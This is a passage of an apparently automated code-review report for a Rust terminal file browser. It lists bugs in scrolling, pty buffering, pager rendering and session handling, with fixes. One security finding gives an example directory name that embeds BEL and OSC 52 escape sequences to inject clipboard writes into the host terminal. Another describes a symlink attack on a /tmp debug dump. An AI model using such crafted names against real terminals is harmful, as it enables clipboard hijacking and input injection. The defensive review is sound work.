+Pane::scroll_up (line 472) clamps scroll_offset only against max_scrollback(), which is hardcoded to 10_000 (line 533), and scroll_to_top (line 486) sets scroll_offset = 10_000 unconditionally. But vt100 0.16.2's Screen::set_scrollback clamps to the *actual* buffer length (grid.rs:198-200: `self.scrollback_offset = rows.min(self.scrollback.len())`), and apply_scroll (line 536) never reads the clamped value back. Concrete failure: in a pane with, say, 200 lines of real scrollback, the user enters scroll mode and presses 'g' (pane_scroll.rs:280 calls scroll_to_top) — scroll_offset becomes 10_000 while the view clamps to 200. Every subsequent 'j' / ctrl-d / ctrl-f decrements the virtual offset (10_000 → 9_990 → ...) with zero visible movement; the user would need ~980 ctrl-d presses before the viewport moves. The same dead zone builds up by holding 'k' past the top of a short buffer. Scroll-down looks completely broken; only 'G' (scroll_to_bottom → 0) or exiting scroll mode recovers.
+
+**Fix:** Make apply_scroll take &mut self and sync the field with what vt100 actually accepted: `self.scroll_offset = self.with_screen_mut(|s| { s.set_scrollback(off); s.scrollback() });` (Screen::scrollback() is public, screen.rs:122). Alternatively clamp scroll_up/scroll_to_top against the real scrollback length (vt100 0.16 exposes it via Screen; or probe via set_scrollback(usize::MAX) read-back) instead of the 10_000 constant.
+
+### `src/pane/mod.rs:518` — max_scrollback() hardcodes 10_000; scroll_offset is never synced to vt100's clamp, creating a dead zone after scroll_to_top
+`medium` · `maintainability` · `pane-pty` · **confirmed**
+
+max_scrollback() returns a constant 10_000 regardless of how many scrollback rows actually exist, and its comment is leftover brainstorming ('Actually, set_scrollback(usize::MAX) clamps internally... For now, use a reasonable upper bound') describing approaches that were never implemented. Consequence: scroll_to_top (mod.rs:485-488, bound to a key in app/pane_scroll.rs:280) sets scroll_offset = 10_000, and scroll_up's .min(max) lets the offset climb to 10_000 while holding k at the top. vt100 0.16.2 clamps the view (grid.rs:199: rows.min(self.scrollback.len())) but apply_scroll (mod.rs:536-539) never reads the clamped value back via Screen::scrollback(). So in a pane with, say, 200 real scrollback lines, after scroll_to_top the stored offset is 10_000 and each j (scroll_down_or_exit(1)) decrements from 10_000 — the viewport doesn't move for ~9,800 presses; scrolling appears dead until the user exits scroll mode. The fn also carries #[allow(clippy::unused_self)] just to keep the heuristic alive.
+
+**Fix:** Sync the offset to reality: make apply_scroll read back the clamp, e.g. self.scroll_offset = self.with_screen_mut(|s| { s.set_scrollback(off); s.scrollback() }); then scroll_to_top can keep passing usize::MAX-ish values safely and max_scrollback() (plus its stale comment) can be deleted.
+
+> verifier: confirmed: Every element of the finding holds against the code. (1) src/pane/mod.rs:517-534: max_scrollback() is a const fn returning hardcoded 10_000 with #[allow(clippy::unused_self)] and the verbatim leftover brainstorming comment describing never-implemented approaches. (2) scroll_to_top (mod.rs:485-488) sets scroll_offset = 10_000 and is reachable via `gg` in scroll mode (src/app/pane_scroll.rs:271-282, call at line 280); scroll_up (mod.rs:471-472) likewise lets the offset inflate to 10_000 while holding k at the top. (3) Cargo.lock pins vt100 0.16.2, whose Grid::set_scrollback (grid.rs:1 …
+
+### `src/pane/mod.rs:607` — vt100 panic recovery rebuilds the parser at the adopt-time size, and the resize coalescer guarantees it never gets corrected
+`medium` · `security` · `pane-pty` · **unverified**
+
+parser_worker's catch_unwind recovery path (the documented defense against malformed/hostile escape sequences that panic vt100 0.15, e.g. nvim's exit-from-alt-screen stream) replaces the poisoned parser with `vt100::Parser::new(initial_size.0, initial_size.1, 10_000)` where initial_size was captured once at Pane::adopt (src/pane/mod.rs:175, `let last_size = host.last_size;`). If the pane has been resized since adopt, the recovered grid has the stale dimensions while the child keeps drawing at host.last_size (the current size). Worse, Pane::resize (src/pane/mod.rs:294) early-returns when `(rows, cols) == self.host.last_size` — which still holds the *current* size — so the parser's screen_mut().set_size() is never re-run and the mismatch persists until the user physically changes the terminal/pane geometry. Net effect: untrusted pty output can put a long-lived pane into a permanently garbled state (content wrapping at the old width, cursor math off) rather than the documented "blank briefly, then the child repaints".
+
+**Fix:** Capture the live size at recovery time instead of adopt time: read `p.screen().size()` from the recovered (into_inner) guard before replacing the parser, or share the current size with the worker (e.g. an Arc<Mutex<(u16,u16)>> or two AtomicU16s that Pane::resize updates) and use that when constructing the replacement parser.
+
+### `src/pane/pathref.rs:130` — Handrolled strip_ansi duplicates the strip_ansi_escapes crate that is already a dependency
+`medium` · `maintainability` · `pane-pty` · **unverified**
+
+pathref.rs hand-rolls a 30-line ANSI stripper while the project already depends on the strip_ansi_escapes crate — src/app/util.rs:207-208 wraps strip_ansi_escapes::strip_str for the rest of the app. The handroll is also subtly wrong: the OSC branch (line 147-153) terminates on any '\\' character, so a literal backslash inside an OSC payload ends the skip early (real ST is the two-byte ESC \\), and non-CSI/OSC escapes (ESC ( B charset designation, ESC M, etc.) are passed through with the ESC dropped but the following byte kept, corrupting the token stream. The repo owner's explicit preference is a focused crate over a handroll, and here the crate is already in the tree.
+
+**Fix:** Replace fn strip_ansi with a direct call to strip_ansi_escapes::strip_str (calling the crate directly keeps the pane → app dependency direction clean) and delete the handroll plus its two unit tests' bespoke coverage.
+
+### `src/pane/pty_host.rs:208` — Unbounded reader->parser channel with a reader that never stops reading: no backpressure, unbounded memory under a firehose child
+`medium` · `perf` · `pane-pty` · **unverified**
+
+`PtyHost::spawn` creates an unbounded `mpsc::channel::<PtyEvent>()` (pty_host.rs:208) and `reader_loop` (pty_host.rs:481-519) reads the pty as fast as the child produces, allocating a fresh `Vec` per 8 KB chunk (line 504) and sending unconditionally. The consumer for a Pane is `parser_worker` (src/pane/mod.rs:587-591), which must take the parser mutex per chunk — the same mutex the render thread holds for the entire O(rows×cols) cell-grid draw (src/app/render/inner.rs:298). During a byte storm every chunk also wakes the main loop, so renders are frequent and the worker is repeatedly stalled behind full-frame draws. A child emitting output faster than parse+contention can drain (`cat` a multi-GB log, `yes`, a verbose build left running in a background tab) grows the channel without bound — hundreds of MB of buffered `Vec<u8>` chunks with no cap and no way to shed — followed by a long catch-up stall where the grid replays stale output. Real terminal muxers get flow control for free by not reading when behind; here the reader always reads, so the kernel pty buffer never fills and the child is never throttled.
+
+**Fix:** Use `mpsc::sync_channel` with a bounded depth (e.g. a few hundred chunks): a blocked `send` stops the reader, the kernel pty buffer fills, and the child blocks on write — natural flow control with no protocol change (`send` still errors out when the receiver is dropped, so teardown is unaffected). Alternatively coalesce: when the channel is over a threshold, concatenate chunks before sending.
+
+### `src/pane/pty_host.rs:317` — SPYC_PTY_DEBUG dumps raw pty bytes to a fixed, world-readable, symlink-followable path in /tmp
+`medium` · `security` · `pane-pty` · **unverified**
+
+When debug_dump is enabled (SPYC_PTY_DEBUG set, gated at src/pane/mod.rs:148), both PtyHost::drain (src/pane/pty_host.rs:312-319) and the pane parser_worker (src/pane/mod.rs:579-585) open "/tmp/spyc_pty_debug.bin" with OpenOptions::new().create(true).append(true) and append every raw byte the pty produces — i.e. the full terminal stream, including any secrets echoed or printed in any pane. Problems: (1) the file is created with default umask permissions (typically 0644) in the world-writable shared /tmp, so any other local account can read the accumulated terminal contents; (2) open() follows symlinks, so a pre-planted /tmp/spyc_pty_debug.bin -> <victim file> symlink turns the debug dump into an append to an arbitrary file owned by the user; (3) the fixed name means multiple spyc instances (or multiple users) interleave into one ever-growing file that is never truncated or cleaned up. The threat-model brief explicitly calls out world-readable files holding sensitive data; this is opt-in debug tooling, which bounds it, but a developer who flips the flag once leaves their terminal history readable in /tmp indefinitely.
+
+**Fix:** Write the dump under a per-user, per-process path instead of a fixed /tmp name — e.g. $XDG_RUNTIME_DIR or ~/.cache/spyc/pty-debug-<pid>.bin — created with mode 0600 (OpenOptionsExt::mode(0o600)) and, if /tmp must stay supported, O_NOFOLLOW/create_new to defeat symlink pre-creation. Truncate or rotate at startup.
+
+### `src/pane/quick_select.rs:223` — Quick Select Match.col is a byte offset but is rendered as a terminal-cell column, misplacing labels on lines with multibyte characters
+`medium` · `correctness` · `pane-pty` · **confirmed**
+
+scan() records `col: start` (line 223) where start is regex::Match::start() — a *byte* offset into the line. The overlay renderer uses it directly as a cell coordinate: src/app/quick_select.rs:235 does `x: pane_rect.x + m.col as u16`. Any multibyte character before the match shifts the label right by (utf8_len − display_width) cells. This is not a rare case in the primary use environment: Claude panes routinely prefix lines with U+23FA '⏺' and U+23BF '⎿' (3 bytes, 1 cell → 2-cell drift each), and box-drawing-heavy output (e.g. tables full of '│', 3 bytes/1 cell each) drifts by 2 cells per character — a path after ten box-drawing cells renders its label 20 cells to the right, on top of unrelated text or a *different* match, so the user can press the label they see over match A and actually yank/open match B. Labels can also be silently dropped by the `m.col >= pane_rect.width` guard (app/quick_select.rs:207) even though the match is visible. The struct comment (lines 82-87) acknowledges the approximation but underestimates how common non-ASCII prefixes are in agent-pane output.
+
+**Fix:** Compute the column as the display width of the line prefix: `col: line[..start].width()` using unicode_width::UnicodeWidthStr (already a transitive dep via ratatui), so the byte→cell conversion happens once at scan time and the renderer stays unchanged.
+
+> verifier: confirmed: All three concrete claims check out against the code. (1) src/pane/quick_select.rs:223 stores `col: start` where `start` is regex::Match::start(), a byte offset into the line string produced by Pane::visible_lines() (src/pane/mod.rs:406, `s.contents().lines()` — plain UTF-8 of the vt100 grid). (2) src/app/quick_select.rs:235 uses it directly as a terminal-cell x coordinate (`x: pane_rect.x + m.col as u16`); no byte→cell conversion exists anywhere on the scan→render path. (3) The guard at src/app/quick_select.rs:207 (`m.col >= pane_rect.width as usize`) compares bytes to cells and ca …
+
+### `src/pane/tabs.rs:20` — Claude-specific session-restore state machine (PendingResumeSend) lives in the generic pane layer
+`medium` · `maintainability` · `pane-pty` · **confirmed**
+
+pane/mod.rs:7-8 states the layering contract: 'The pane is deliberately a generic pty host; agent-specific defaults (claude, send-selection) live in higher layers.' Yet tabs.rs defines PendingResumeSend (lines 20-53), resume_still_unsubmitted (line 61), and the TabInfo fields restore_fallback (line 79) and pending_resume_send (line 90) — all of which encode Claude-CLI-specific policy (banner timing, the /resume slash command, the --resume crash workaround, Claude's input-remount Enter-drop race). Every consumer is in src/app/ (session.rs:292, pane_tabs.rs:135-176, scheduler.rs:90-97); nothing in src/pane/ uses this state. This is app-domain restore policy smuggled into the pane container that Runtime owns, and it will keep accreting (the Verify variant was just added in commit de6b8d0).
+
+**Fix:** Move PendingResumeSend + resume_still_unsubmitted into src/app/ (e.g. app/pane_tabs.rs or a session-restore module) and keep the per-tab state in an app-side side table keyed by tab, or in a generic 'scheduled sends' slot on TabInfo that carries no agent semantics.
+
+> verifier: confirmed: Every factual claim verifies: pane/mod.rs:7-8 states the generic-pty-host contract verbatim; src/pane/tabs.rs:20-53/61/79/90 define PendingResumeSend, resume_still_unsubmitted, restore_fallback, and pending_resume_send, whose doc comments explicitly encode Claude-CLI policy (banner timing, /resume slash command, --resume crash workaround, input-remount Enter-drop race); grep confirms all consumers are in src/app/ (session.rs:292, pane_tabs.rs:135-176 drive the whole state machine, scheduler.rs:90-103, loop_steps.rs:233, confirms.rs:169) and nothing in src/pane/ uses the state beyond …
+
+### `src/pane/tabs.rs:239` — live_cwd() spawns an OS thread (lsof fork-exec) from inside the draw pass
+`medium` · `maintainability` · `pane-pty` · **unverified**
+
+TabEntry::live_cwd (tabs.rs:216-250) is called from the render pass at src/app/render/chrome.rs:115 (render_pane_status_line). Behind &self it mutates state via RefCell/Cell/Arc<Mutex> and, when the TTL expires, calls std::thread::spawn at line 239 to run crate::proc_cwd::cwd_for_pid (an lsof fork-exec on macOS). CLAUDE.md's contract is explicit: 'Render is pure (&self). The draw pass reads ... and mutates nothing; any pre-frame state settling happens in prepare_frame before the draw' and 'don't reach for the OS inside a handler or the render pass.' The interior-mutability machinery (live_cwd_cache, live_cwd_pending, live_cwd_refreshing, live_cwd_kicked_at — four fields) exists solely to smuggle this side effect past the pure-render rule, and it means TestBackend/insta snapshot renders can fork lsof during tests. A pre-draw kick site already exists: App::prepare_panes (src/app/render/mod.rs:247) takes &mut self and already touches pane_tabs every frame.
+
+**Fix:** Split the accessor: a &mut refresh-kick (pick up landed result + spawn-if-stale) called from prepare_panes, and a pure &self cached read for the draw. That removes the RefCell/Cell wrappers (plain Option<PathBuf> + Instant fields) and restores the render-purity invariant.
+
+### `src/pane/widget.rs:37` — Parser mutex held across the whole pane draw — per-frame O(cells) set_string under the lock contends with the parser worker
+`medium` · `perf` · `pane-pty` · **unverified**
+
+`PaneWidget::render` is invoked inside `with_screen` (src/app/render/inner.rs:298 and the overlay path at inner.rs:44), so the parser mutex is held for the full draw: for every cell, `cell.contents()` + `cell_style` + `buf.set_string` (which runs grapheme segmentation per 1-cell string) — ~10k calls per frame for a 200×50 pane, more for the side-by-side overlay which renders two grids in one lock window. The `with_screen` doc (src/pane/mod.rs:362-369) says "keep the closure body short"; the render path is the one caller that structurally can't. Under heavy output this is the contention half of the unbounded-channel problem above: the worker (src/pane/mod.rs:587) blocks behind each frame's full-grid draw, lowering effective parse throughput exactly when chunks arrive fastest, and conversely a worker mid-`process()` on a large chunk delays frame start (input-to-paint latency on the path the owner has chased jank on before).
+
+**Fix:** Render from a snapshot instead of the live parser: in `prepare_frame`, lock once and copy the visible grid into a `ViewState` cache (rows×cols of (char, Style) — ~10k small copies, or use vt100's `Screen: Clone` if cheap enough), keyed by `parser_gen` so unchanged frames skip the copy entirely. The draw pass then reads the cache with zero lock hold, and redundant per-frame recomputation for an idle pane disappears too.
+
+### `src/paths.rs:17` — expand() reads HOME via std::env directly, bypassing the envset overlay it uses for every other variable
+`medium` · `maintainability` · `platform` · **unverified**
+
+expand() resolves `$VAR`/`${VAR}` through crate::envset::var (line 19) but reads HOME for `~` expansion via std::env::var_os("HOME") (line 17); display_tilde does the same at line 41. envset.rs's module doc (lines 12-13) explicitly claims spyc's own reads of user-facing vars including '`$VAR` path expansion' go through the overlay. Result: after a runtime `:s HOME=/x` override, `$HOME/src` expands to /x/src while `~/src` in the very same prompt expands to the original home, and the status-line tilde display also ignores the override. Internally inconsistent behavior and drift from envset's documented contract.
+
+**Fix:** Read HOME through crate::envset::var in both expand() and display_tilde() (the pure expand_with/test seam already takes home as a parameter, so the change is two call-site edits).
+
+### `src/state/inventory.rs:85` — Re-yanking a modified file silently keeps the stale cached content
+`medium` · `correctness` · `state-sessions` · **unverified**
+
+Inventory::yank returns Ok(()) without touching the cache when `self.contains(path)` (matching on orig_path, lines 84-86). Concrete failure: user yanks `notes.txt` (`y`), edits the file, yanks it again expecting the updated copy, then puts (`p`) it in another directory — the destination receives the OLD bytes from the first yank, with no error or warning. yank_many even counts the no-op as a successful yank, so the flash says "yanked N" while the cache is stale. Since put consumes the item (moves it to graveyard), the user only discovers the stale content after the paste, and the fresh version was never captured anywhere.
+
+**Fix:** On re-yank of an already-present orig_path, refresh the cached copy: re-copy into the existing `<id>.dat` (or replace the item) when the source mtime/size differs from the recorded timestamp/size, instead of returning Ok unconditionally.
+
+### `src/state/sessions/mod.rs:127` — load_sessions dedup collapses distinct resumable sessions that share cwd + commands
+`medium` · `correctness` · `state-sessions` · **unverified**
+
+The dedup key (lines 126-138) is `cwd | tab-commands-joined` and `retain` keeps only the most recent. agent_session_id / agent_session_name / session name are not part of the key, so two genuinely different sessions with different Claude/codex conversations become one picker entry. Concrete scenario for the daily multi-instance workflow: two spyc instances open on the same project, each hosting one `claude` pane (different conversations X and Y). Both quit; both save valid session files. The `-r` picker (load_sessions) shows only the newer one — conversation X's resume token is silently hidden, and once 20 more saves accumulate, prune_old deletes its file entirely. The user has no way to reach session X from inside spyc despite it having been saved successfully.
+
+**Fix:** Include the tabs' agent_session_ids (and/or the user-assigned session name) in the dedup key so sessions pointing at different conversations both survive; dedup only true duplicates (same cwd, commands, and resume tokens).
+
+### `src/state/sessions/mod.rs:579` — find_claude_session_name reads the entire conversation JSONL (100+ MB) into memory
+`medium` · `correctness` · `state-sessions` · **unverified**
+
+find_claude_session_name does `std::fs::read_to_string(&jsonl_path)` on the full conversation JSONL, then scans lines in reverse for a `custom-title`. The codebase explicitly documents (src/state/mod.rs:62-66) that these files reach 100+ MB and that reading them whole froze the render thread and allocated hundreds of MB — which is why read_tail_lossy/MAX_TRANSCRIPT_TAIL_BYTES exist — but this function never got that fix. It is called (a) per matching session from find_claude_sessions (sessions/mod.rs:223), which the agent-status worker re-runs on a 30s TTL (src/app/agent_status.rs:81) — off the render thread, but repeatedly allocating hundreds of MB; and (b) on the MAIN thread at quit via save_session → resolve_claude_resume_target (src/app/session.rs:52, src/agent/resume.rs:218/247), so quitting with one or more long-lived Claude panes stalls exit for the duration of reading every matching conversation file. Bonus defect on the same line: the `.ok()?` aborts the whole multi-project scan on the first read error instead of `continue`-ing to the next project dir.
+
+**Fix:** Read only the tail with read_tail_lossy(path, MAX_TRANSCRIPT_TAIL_BYTES) — the reverse scan for the last custom-title only needs recent lines anyway (fall back to a bounded forward read if no title in the tail, or accept the miss). Replace `.ok()?` with a `continue` on read failure.
+
+### `src/sysinfo.rs:42` — rss_kb() still shells out to `ps` on macOS while the same file already reads RSS in-process via the sysinfo crate
+`medium` · `maintainability` · `platform` · **unverified**
+
+rss_kb() (lines 26-60) forks `ps -o rss= -p <pid>` on macOS, justified by the comment at lines 40-41: 'avoids pulling in libc/mach just for this.' That justification is stale — proc_rss_threads() in the same file (lines 68-87) now reads RSS for the same process in-process via the `sysinfo` crate (a Cargo.toml dependency, line 79), and thread count via `libproc`. So the file carries two implementations of 'RSS of self', one of which is a fork-exec on the main thread (format_rss is called from the `I` session-info handler, src/app/session.rs:342). The repo owner's stated rule is focused crates over ps/lsof shell-outs. Also note src/clipboard.rs:14 still cites this file as 'the same cfg(target_os) fork-exec shape', which is now only half true.
+
+**Fix:** Make rss_kb() delegate to the sysinfo-crate path (e.g. extract the System::refresh_processes_specifics block and have both rss_kb and proc_rss_threads use it), delete the macOS `ps` arm and its stale comment, and update the clipboard.rs cross-reference.
+
+### `src/term_title.rs:54` — Terminal escape injection into OSC title from hostile directory names
+`medium` · `security` · `platform` · **unverified**
+
+`set` emits `\x1b]2;{title}\x07` with the title interpolated raw (src/term_title.rs:54), and `compose` (line 58-64) builds the title from the basename of PROJECT_HOME or the browsed cwd via `to_str()`, which passes through valid-UTF-8 control characters (Unix filenames may contain any byte except `/` and NUL). The composed title is written verbatim to the host terminal by the effect executor (src/app/effect.rs:434, fired on every directory change via src/app/run.rs:661). A hostile archive containing a directory named e.g. `x\x07\x1b]52;c;<b64>\x07` terminates the OSC 2 early at the embedded BEL and the remainder reaches the host terminal as raw escape sequences — clipboard write via OSC 52, title-query response injection (CSI 21t answers become shell input on some terminals), etc. This is exactly the "escape sequences from untrusted file contents reaching the host terminal unsanitized" class; spyc's whole purpose is browsing untrusted directories.
+
+**Fix:** Sanitize in `set` (the choke point all titles flow through): strip or replace `char::is_control` characters (at minimum ESC 0x1b, BEL 0x07, and C1 controls) from `title` before formatting the OSC sequence.
+
+### `src/ui/blame_render.rs:44` — render_blame joins and syntect-highlights the whole file on the main thread with no size cap
+`medium` · `perf` · `ui-render` · **unverified**
+
+`render_blame` concatenates every blame line into one `String` (lines 44-49) and runs `highlight_to_lines` over the full file (line 50). Unlike the pager file-open path, which caps work at `MAX_PAGER_BYTES` before highlighting (src/app/pager_handler/mod.rs:309), the blame path has no cap: `git::blame::blame` produces one `BlameLine` per file line unbounded (src/git/blame.rs:38-61). The render runs on the main thread via `GitViewStream::drain` → `render_into` (src/app/git_view_session.rs:219, 181). Blaming a large generated/vendored file (tens of thousands of lines) blocks the event loop for the full syntect pass after the off-thread blame completes — the user sees 'computing…' finish and then the UI hangs for the highlight.
+
+**Fix:** Apply the same byte/line cap the pager uses before attempting syntect (fall back to plain `Span::raw` rows past the cap), and/or move the render into the worker thread alongside the blame build as for the diff finding.
+
+### `src/ui/diff_render/mod.rs:149` — Diff render syntect-highlights both full sides on the main thread, and re-highlights from scratch on every layout toggle
+`medium` · `perf` · `ui-render` · **unverified**
+
+`render_file_unified` (lines 148-150) and `render_file_split` (lines 238-240) call `highlight_side` → `crate::ui::syntax::highlight_to_lines` over the entire reconstructed old and new texts of every file. The `DiffModel` is bounded at MAX_DIFF_LINES = 50,000 lines (src/git/diff_model/blob.rs:21), so the worst case is ~50k lines × 2 sides through syntect's default-fancy regex engine — easily multiple seconds. This whole render runs on the MAIN thread: `GitViewStream::drain` calls `render_into` when the worker payload arrives (src/app/git_view_session.rs:209), defeating the point of building the model off-thread, and `on_pager_command(ToggleLayout)` (git_view_session.rs:248) re-runs the full syntect pass again even though the module doc claims the retained model makes the `|` toggle 're-render instantly without re-touching gix' — gix is skipped but syntect, the dominant cost, is not. A vendored-deps or generated-code diff that hits the 50k cap freezes the input loop for seconds on open and again on every `|` press.
+
+**Fix:** Either render the lines in the worker thread (Theme is Clone + Send; ship `Rendered` for both layouts, or render the current layout off-thread and the other lazily), or cache the per-side highlight results (`new_hl`/`old_hl` per file) in `GitViewStream` alongside the retained model so the `|` toggle only redoes the cheap layout pass.
+
+### `src/ui/markdown/mod.rs:136` — Regex compiled on every markdown render call
+`medium` · `maintainability` · `ui-render` · **unverified**
+
+force_hard_breaks_before_keyed_lines() calls regex::Regex::new(r"\n(\*\*[^*\n]+:\*\*)") inline, and it is invoked from render() (src/ui/markdown/mod.rs:61) on every call. render() is called once per agent prose block via state::push_agent_markdown (src/state/mod.rs:119), which the claude/codex/agy transcript renderers call per message (src/state/claude_transcript.rs:108, src/state/agy_transcript.rs:99, src/state/codex_transcript.rs:198). A long transcript reload therefore recompiles the same static regex hundreds of times. The codebase already uses the LazyLock pattern for exactly this (SYNTAX_SET/THEME_SET in src/ui/syntax.rs:36-37).
+
+**Fix:** Hoist the regex into a `static RE: LazyLock<Regex> = LazyLock::new(|| Regex::new(...).expect(...));` at module scope, matching the syntax.rs pattern.
+
+### `src/ui/mod.rs:13` — Blanket #[allow(dead_code, ...)] on line_edit hides real dead code
+`medium` · `maintainability` · `ui-render` · **unverified**
+
+`pub mod line_edit` carries a module-wide #[allow(dead_code, clippy::unnested_or_patterns, clippy::missing_const_for_fn, clippy::match_same_arms)]. line_edit is now heavily used (App prompts, session restore, pager pickers), so the dead_code allow is stale — and it is actively masking dead code: removing the allow and running cargo check produces exactly one warning, `method is_empty is never used` (src/ui/line_edit.rs:85). The blanket allow also disables dead-code detection for any future rot in this 712-line module.
+
+**Fix:** Delete `LineEditor::is_empty`, remove `dead_code` from the allow list (verified the build is then clean), and either fix or move the three clippy allows onto the specific items that need them instead of the whole module.
+
+### `src/ui/pager/construct.rs:58` — new_plain duplicates the entire 35-field PagerView initializer from new_styled
+`medium` · `maintainability` · `ui-pager` · **unverified**
+
+new_styled (construct.rs:19-54) and new_plain (construct.rs:58-93) are byte-identical except for `lines` (new_plain maps String -> Line). Every one of PagerView's ~35 fields is spelled out twice; any new field (there have been many: stream_id, placement, pending_scroll_to_bottom...) must be added in both places, and a divergence in defaults would be silent. There are 34 external call sites of these constructors, so the duplication is load-bearing.
+
+**Fix:** Make new_plain delegate: `Self::new_styled(title, lines.into_iter().map(Line::from).collect())`. One initializer remains the single source of default values.
+
+### `src/ui/pager/construct.rs:182` — Pager yank/save methods do inline OS side effects, bypassing the existing Effect::CopyToClipboard path
+`medium` · `maintainability` · `ui-pager` · **unverified**
+
+PagerView::yank_to_clipboard (construct.rs:182), yank_visible_to_clipboard (construct.rs:192), yank_visual_to_clipboard (selection.rs:348, calls crate::clipboard::copy directly), save_to_file (construct.rs:114, fs::write + env::current_dir) and write_to_temp (construct.rs:124) all perform OS I/O. They are invoked synchronously from the pager *key handler* (src/app/pager_handler/motion.rs:161, 168, 230, 293 and modes.rs:367), i.e. inside the update path. CLAUDE.md says handlers "return Vec<Effect> and never touch the OS directly", and the codebase already has exactly the needed machinery: Effect::CopyToClipboard with a ClipMsg flash recipe, executed only by run_effects (src/app/effect.rs:56, 326). So pager yanks are a second, parallel clipboard mechanism that violates the effects-as-data contract and puts a blocking fork-exec (pbcopy/xclip wait) on the input path.
+
+**Fix:** Keep the pure parts (source_text/with_title_header already exist) and have the handlers return Effect::CopyToClipboard { text, ok } instead of calling clipboard::copy inline; add a small Effect::SaveBufferToFile / Effect::WritePagerTemp for the s/v paths. The PagerView methods then become pure text/path producers.
+
+### `src/ui/pager/layout.rs:131` — visual_rows underestimates actual wrapped rows (wide-char greedy waste + whitespace markers), so scroll_max clamps before the real bottom
+`medium` · `correctness` · `ui-pager` · **unverified**
+
+`scroll_max` (scroll_search.rs:111) walks lines from the end using `visual_rows`, whose comment claims it 'mirrors wrap_line's greedy hard-break policy'. It doesn't: it computes `total_width.div_ceil(width)`, while `wrap_line` (layout.rs:154) breaks greedily and wastes a column whenever a 2-wide char doesn't fit the last remaining cell. Example: body_w=10 with repeating 'a中中中中' content packs only 9 cols per row, so 10 repeats = 13 actual rows vs 11 estimated. Second, larger cause: `visual_rows` measures the raw line, but the renderer wraps the marker-augmented line — `apply_whitespace_markers` (render.rs:165-169, 583) appends `$` (+1 col per line), expands `\r` to `^M` (+1), and tab to `→` (raw tab counts 0 in visual_rows). With `w` toggled on a file whose lines are exactly body_w wide, every line really occupies 2 rows but is estimated at 1, so scroll_max is roughly half what it should be. Since `clamp_scroll` enforces this bound, the user presses G, the indicator says 'Bot', and the last lines of the document are unreachable — the exact bug class the `scroll_max_accounts_for_wrapped_visual_rows` regression test was added for, surviving in these two residual forms.
+
+**Fix:** Make the estimate match the renderer: have `scroll_max` count rows via the same greedy algorithm as `wrap_line` (a non-allocating row-counting twin that tracks per-row remaining width), and run it on the marker-expanded width when `show_whitespace` is set (e.g. add the +1 for `$`, +1 per `\r`/tab).
+
+### `src/ui/pager/mod.rs:141` — scroll: u16 silently caps every pager at 65,535 lines — reachable content beyond that is unviewable
+`medium` · `maintainability` · `ui-pager` · **unverified**
+
+PagerView::scroll is u16 (mod.rs:141), and all the math saturates rather than fails: scroll_max clamps via `u16::try_from(...).unwrap_or(u16::MAX)` (scroll_search.rs:97-98), line_count saturates (scroll_search.rs:62), scroll_by clamps. A buffer with more than 65,535 lines therefore has an unreachable tail — G lands at line 65,536 and j/k can't go further, with no indication why. This is reachable today: the file-pager line cap of 5,000 only applies to files over MAX_PAGER_BYTES = 5 MiB (src/fs/ops.rs:32-38), so a <=5 MiB file with short lines (e.g. a 5 MB log at ~60 bytes/line ≈ 87k lines) loads fully but can't be scrolled past 64k; streaming grep/transcript pagers can also grow past it (line_count_hint exists precisely because streaming counts grow). Given the user base includes heavy-files daily drivers, this will eventually bite as a confusing "pager stops scrolling" report.
+
+**Fix:** Widen scroll (and saved_alt_scroll / the cached cells' consumers) to usize/u32, or enforce the same hard line cap on every pager source and surface a 'truncated at N lines' flash like the file path already does.
+
+### `src/ui/pager/render.rs:125` — With wrap on, scroll is logical-line granular — visual rows of a long line beyond the first viewport_h are unreachable
+`medium` · `perf` · `ui-pager` · **unverified**
+
+`render_single_column` starts painting at `let start = view.scroll as usize` (render.rs:125), a *logical* line index, and fills the viewport from that line's first wrapped piece. There is no intra-line visual-row offset anywhere in `PagerView` (mod.rs `scroll: u16` is the only position state), and `scroll_by`/`scroll_max` (scroll_search.rs) all operate in logical lines. Consequence: any single logical line that wraps to more than `viewport_h` visual rows can only ever show its first `viewport_h` rows — at scroll=i you see the top of the line, at scroll=i+1 you've skipped the rest entirely. Concrete repro: open a file whose first line is longer than viewport_h*body_w chars (a minified bundle, a long base64 blob in a transcript or `!` capture) — the middle of that line is unviewable and j appears to 'jump' past thousands of rows. This bites the transcript/scrollback pager (`wrap = true` forced in src/app/pane_scroll.rs) where agent output routinely contains very long single lines.
+
+**Fix:** Track scroll as (logical_line, visual_row_within_line) — or a flat visual-row index with a cached prefix-sum of `visual_rows` per line invalidated on resize/toggle — so j/k advance one visual row. The `visual_rows` helper in layout.rs already mirrors wrap math and can back the prefix sums.
+
+### `src/ui/pager/render.rs:180` — wrap_line materializes the full wrapped expansion of each visible logical line every frame — allocation churn proportional to longest line, not viewport
+`medium` · `perf` · `ui-pager` · **unverified**
+
+In `render_single_column`, each visible source line is wrapped with `wrap_line(&styled, body_w)` (render.rs:180) which returns ALL pieces; the consuming loop then breaks once `display_lines.len() >= viewport_h` (render.rs:185), discarding the rest. There is no cap on logical-line *length* anywhere in the pager (the file pager only truncates at 5000 lines, src/app/pager_handler/mod.rs:439), and wrap defaults on for content pagers and the transcript/scrollback pager. So opening a minified JS bundle or a single-line JSON of 2 MB with a 120-col body wraps it into ~17,000 owned `Line`s (each with freshly allocated Strings via the span split in layout.rs:188) on every frame, of which ~50 are kept. Held-down j/k key-repeat redraws make this tens of MB/s of allocation + copy on the render path. `position_indicator` (render.rs:25) additionally calls `scroll_max` → `visual_rows` which walks every char of such a line per frame, though that part is at least linear without allocation.
+
+**Fix:** Pass a row budget into `wrap_line` (e.g. `max_rows: viewport_h - display_lines.len()`) and stop chunking once the budget is filled, or convert it to an iterator that the render loop drives lazily. The styling passes (`apply_row_styling`, `apply_whitespace_markers`) already run before the wrap, so a budgeted wrap is behavior-identical for everything on screen.
+
+### `src/ui/pager/selection.rs:281` — Visual/placement auto-scroll assumes 1 logical line = 1 screen row; with wrap on the cursor moves off-screen without scrolling
+`medium` · `correctness` · `ui-pager` · **unverified**
+
